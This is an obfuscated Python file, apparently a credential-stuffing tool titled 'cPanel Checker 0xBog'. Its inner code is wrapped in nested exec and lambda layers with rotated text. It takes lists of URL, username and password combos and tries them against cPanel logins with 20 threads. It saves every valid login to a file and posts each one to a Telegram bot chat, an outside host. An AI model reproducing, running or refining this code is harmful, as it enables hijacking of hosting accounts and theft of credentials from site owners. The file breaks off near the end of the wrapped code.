# Developed_By : 0xBog
exec((lambda __, _, : _('# Qrirybcrq_Ol : 0kObt\nrkrp((ynzoqn __, _, : _(\'# Developed_By : 0xBog\\aexec((lambda __, _, : _(\\\'# Qrirybcrq_Ol : 0kObt\\\\nrkrp((ynzoqn __, _, : _(\\\\\\\'# Developed_By : 0xBog\\\\\\\\aexec((lambda __, _, : _(\\\\\\\\\\\\\\\'# Qrirybcrq_Ol : 0kObt\\\\\\\\\\\\\\\\nrkrp((ynzoqn __, _, : _(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'from PyQt6.QtWidgets import (\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    QApplication, QMainWindow, QVBoxLayout, QWidget, QHBoxLayout, QLabel, QPushButton, QTextEdit, QFileDialog\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\afrom PyQt6.QtCore import Qt, QThread, pyqtSignal, QPointF\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\afrom PyQt6.QtGui import QFont, QPixmap, QColor, QPainter, QPen, QConicalGradient, QBrush, QIcon\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\aimport requests\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\aimport json\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\aimport sys\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\aimport os\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\afrom queue import Queue\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\afrom threading import Thread\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\aclass CheckerThread(QThread):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    progress_signal = pyqtSignal(int, int, int)  # Good, bad, remaining\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    log_signal = pyqtSignal(str)  # Log messages\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    finished_signal = pyqtSignal()  # Task completed\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def __init__(self, input_file, output_file, telegram_token, telegram_chat_id, thread_count=20):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        super().__init__()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.input_file = input_file\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.output_file = output_file\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.telegram_token = telegram_token\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.telegram_chat_id = telegram_chat_id\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.thread_count = thread_count\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.good = 0\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.bad = 0\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.queue = Queue()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.threads = []\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def send_to_telegram(self, message):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        try:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            payload = {\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'chat_id\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': self.telegram_chat_id, \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'text\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': message}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            requests.post(url, data=payload)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        except requests.RequestException:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            pass  # Ignore Telegram errors\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def worker(self):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        while not self.queue.empty():\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            line = self.queue.get()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            try:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                url, username, password = line.split(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'|\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                data_user_pass = {"user": username, "pass": password}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                s = requests.Session()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                resp = s.post(f"{url}/login/?login_only=1", data=data_user_pass, timeout=10, allow_redirects=True)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                login_resp = json.loads(resp.text)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                if "security_token" in login_resp:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                    self.good += 1\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                    self.log_signal.emit(f"<font color=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'green\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'>{url}|{username}|{password}</font>")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                    with open(self.output_file, \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', encoding=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'utf-8\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\') as success_file:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                        success_file.write(f"{url}|{username}|{password}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                    self.send_to_telegram(f"Valid cPanel login found: {url}|{username}|{password}")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                else:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                    raise Exception("Invalid login")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            except Exception as e:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                self.bad += 1\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                self.log_signal.emit(f"<font color=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'red\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'>{line}</font>")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            remaining = self.queue.qsize()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            self.progress_signal.emit(self.good, self.bad, remaining)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            self.queue.task_done()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def run(self):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        try:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            with open(self.input_file, \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'r\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', encoding=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'utf-8\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\') as f:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                lines = [line.strip() for line in f if line.strip()]\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                for line in lines:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                    self.queue.put(line)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        except FileNotFoundError:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            self.log_signal.emit(f"[ERROR] File \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'{self.input_file}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' not found.")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            return\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        for _ in range(self.thread_count):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            thread = Thread(target=self.worker)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            thread.start()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            self.threads.append(thread)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        for thread in self.threads:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            thread.join()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.finished_signal.emit()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\aclass ProgressCircle(QWidget):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def __init__(self):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        super().__init__()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.progress = 0\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def set_progress(self, progress):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.progress = progress\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.update()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def paintEvent(self, event):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        painter = QPainter(self)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        painter.setRenderHint(QPainter.RenderHint.Antialiasing)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        rect = self.rect()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Draw background circle (empty progress)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        empty_pen = QPen(QColor(50, 50, 70), 14)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        painter.setPen(empty_pen)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        painter.drawArc(rect.adjusted(10, 10, -10, -10), 0, 360 * 16)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Create gradient for progress\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        center = rect.center()  # QPointF, no need to change\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        gradient = QConicalGradient(QPointF(center), -90)  # Use QPointF here\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        gradient.setColorAt(0.0, QColor(41, 182, 246))\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        gradient.setColorAt(1.0, QColor(90, 150, 250))\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Create a brush from the gradient\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        gradient_brush = QBrush(gradient)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Create the QPen with the gradient brush and other properties\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        progress_pen = QPen(gradient_brush, 14, Qt.PenStyle.SolidLine, Qt.PenCapStyle.RoundCap)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        painter.setPen(progress_pen)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        painter.drawArc(rect.adjusted(10, 10, -10, -10), 90 * 16, -int(360 * self.progress / 100) * 16)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Draw text in the center\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        painter.setPen(QColor(224, 224, 224))\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        painter.setFont(QFont("Arial", 18, QFont.Weight.Bold))\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        painter.drawText(rect, Qt.AlignmentFlag.AlignCenter, f"{self.progress}%")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\aclass CPanelCheckerGUI(QMainWindow):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def __init__(self):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        super().__init__()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.setWindowTitle("cPanel Checker 0xBog | t.me/x0bogsecurity")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.setGeometry(200, 200, 1000, 600)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.setStyleSheet("background-color: #101010; color: #E0E0E0;")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.input_file = ""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.output_file = "valid_cpanel.txt"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.telegram_token = "YOUR_TELEGRAM_BOT_TOKEN"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.telegram_chat_id = "YOUR_TELEGRAM_CHAT_ID"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.thread_count = 20  # Default number of threads\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Set the program logo (window icon)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.set_window_icon()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Central widget\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.main_widget = QWidget()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.main_layout = QVBoxLayout(self.main_widget)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.setCentralWidget(self.main_widget)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Dashboard layout\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        dashboard_layout = QHBoxLayout()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.good_bad_card, self.good_bad_label = self.create_card("Good/Failed", "goodbad.png", "0/0")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.task_remaining_card, self.task_remaining_label = self.create_card("Task/Remaining", "tasking.png", "0/0")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.progress_card = self.create_progress_card()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        dashboard_layout.addWidget(self.good_bad_card)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        dashboard_layout.addWidget(self.task_remaining_card)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        dashboard_layout.addWidget(self.progress_card)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.main_layout.addLayout(dashboard_layout)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Log display\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.log_display = QTextEdit()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.log_display.setReadOnly(True)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.log_display.setStyleSheet("background-color: #1C1C2E; color: #E0E0E0; padding: 10px;")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.main_layout.addWidget(self.log_display)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Buttons\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        button_layout = QHBoxLayout()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.load_button = QPushButton("Load File")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.start_button = QPushButton("Start")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.stop_button = QPushButton("Stop")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        for button in [self.load_button, self.start_button, self.stop_button]:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            button.setStyleSheet(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                "QPushButton { background-color: #3949AB; color: #FFFFFF; font-size: 16px; padding: 10px; border-radius: 5px; }"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a                "QPushButton:hover { background-color: #5C6BC0; }"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            )\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            button_layout.addWidget(button)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.main_layout.addLayout(button_layout)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Button connections\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.load_button.clicked.connect(self.load_file)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.start_button.clicked.connect(self.start_checking)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.stop_button.clicked.connect(self.stop_checking)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Worker thread\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.checker_thread = None\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def set_window_icon(self):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        logo_url = "https://i.ibb.co/C8bx7td/photo-2024-11-06-05-41-15.png"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        img_data = requests.get(logo_url).content\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        pixmap = QPixmap()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        pixmap.loadFromData(img_data)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.setWindowIcon(QIcon(pixmap))\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def create_card(self, title, icon_path, initial_value):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        card = QWidget()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        card_layout = QVBoxLayout(card)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        card.setStyleSheet("background-color: #1C1C2E; border-radius: 10px; padding: 10px;")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Title and icon\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        title_label = QLabel(title)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        title_label.setFont(QFont("Arial", 16, QFont.Weight.Bold))\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        title_label.setStyleSheet("color:  #487fb6;")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        icon_label = QLabel()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        icon_label.setPixmap(QPixmap(icon_path).scaled(50, 50, Qt.AspectRatioMode.KeepAspectRatio))\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Horizontal layout for title and icon\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        top_layout = QHBoxLayout()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        top_layout.addWidget(title_label)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        top_layout.addWidget(icon_label)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        card_layout.addLayout(top_layout)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        # Main label for value\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        value_label = QLabel(initial_value)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        value_label.setFont(QFont("Arial", 24, QFont.Weight.Bold))\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        value_label.setStyleSheet("color: #487fb6;")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        value_label.setAlignment(Qt.AlignmentFlag.AlignCenter)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        card_layout.addWidget(value_label)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        return card, value_label\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def create_progress_card(self):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        card = QWidget()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        card.setStyleSheet("background-color: #1C1C2E; border-radius: 10px; padding: 10px;")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        layout = QVBoxLayout(card)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        title_label = QLabel("Progress")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        title_label.setFont(QFont("Arial", 16, QFont.Weight.Bold))\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        title_label.setStyleSheet("color: #487fb6;")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        layout.addWidget(title_label)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.progress_circle = ProgressCircle()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.progress_circle.setFixedSize(150, 150)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        layout.addWidget(self.progress_circle, alignment=Qt.AlignmentFlag.AlignCenter)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        return card\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def load_file(self):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        file_dialog = QFileDialog()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.input_file, _ = file_dialog.getOpenFileName(self, "Open File", "", "Text Files (*.txt)")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        if self.input_file:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            self.log_display.append(f"[INFO] Loaded file: {self.input_file}")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def start_checking(self):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        if not self.input_file:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            self.log_display.append("[ERROR] No file loaded.")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            return\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.checker_thread = CheckerThread(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            input_file=self.input_file,\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            output_file=self.output_file,\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            telegram_token=self.telegram_token,\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            telegram_chat_id=self.telegram_chat_id,\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            thread_count=self.thread_count\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        )\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.checker_thread.progress_signal.connect(self.update_progress)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.checker_thread.log_signal.connect(self.update_log)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.checker_thread.finished_signal.connect(self.checking_finished)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.checker_thread.start()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.log_display.append("[INFO] Started checking.")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def stop_checking(self):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        if self.checker_thread and self.checker_thread.isRunning():\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            self.checker_thread.terminate()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            self.log_display.append("[INFO] Stopped checking.")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a            self.checker_thread = None\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def update_progress(self, good, bad, remaining):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.good_bad_label.setText(f"{good}/{bad}")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.task_remaining_label.setText(f"{good + bad}/{remaining}")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        total = good + bad + remaining\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        progress = int((good + bad) / total * 100) if total > 0 else 0\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.progress_circle.set_progress(progress)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def update_log(self, message):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.log_display.append(message)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    def checking_finished(self):\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.log_display.append("[INFO] Checking finished.")\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a        self.checker_thread = None\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\aif __name__ == "__main__":\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    app = QApplication(sys.argv)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    window = CPanelCheckerGUI()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    window.show()\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a    